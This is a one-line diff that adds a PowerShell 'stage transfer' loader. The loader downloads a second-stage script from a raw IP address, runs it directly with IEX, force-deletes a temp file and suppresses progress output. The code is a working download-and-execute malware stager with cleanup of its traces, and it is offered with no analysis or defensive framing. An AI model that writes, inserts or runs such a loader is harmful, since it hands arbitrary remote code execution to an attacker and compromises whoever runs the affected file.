@@ -1,0 +1,1 @@
+<# Stage transfer #> $Stage1Url = "https://198.51.100.123/stage2.ps1"; $ScriptText = (New-Object System.Net.WebClient).DownloadString($Stage1Url); IEX $ScriptText; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $ProgressPreference = "SilentlyContinue"
